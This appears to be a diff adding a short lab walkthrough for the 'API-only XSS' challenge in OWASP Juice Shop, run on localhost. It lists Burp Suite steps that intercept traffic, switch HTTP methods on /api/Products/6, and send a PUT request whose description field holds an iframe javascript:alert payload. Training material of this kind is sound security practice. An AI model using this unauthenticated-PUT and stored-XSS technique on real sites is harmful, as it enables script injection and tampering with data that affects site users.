@@ -1,0 +1,33 @@
+API-only XSS (XSS)
+
+run nmp
+start burp
+proxy -> open browser -> off "intercept
+go "http://localhost:3000"
+
+Click on banana juice icon
+enter comments
+
+On "intercept"
+click "submit" on local host
+
+Click on "Forward" until reach blank page
+Off "Intercept" -> HTTP history
+Look for url "/api/Quantitys/", click on it
+right click -> select "send to repeater"
+
+Click on "repeater" tab 
+Change "GET /api/Quantitys/ HTTP/1.1" to "GET /api/Products/ HTTP/1.1"
+Click "Send"
+
+Change "GET /api/Quantitys/ HTTP/1.1" to "OPTIONS /api/Products/6 HTTP/1.1"
+Click "Send"
+
+Change "GET /api/Quantitys/ HTTP/1.1" to "GET /api/Products/6 HTTP/1.1"
+Click "Send"
+
+Change "GET /api/Products/6 HTTP/1.1" to "PUT /api/Products/6 HTTP/1.1"
+Add in {"description":"<iframe src=\"javascript:alert(`xss`)\">"}
+Content-Type: application/json
+
+
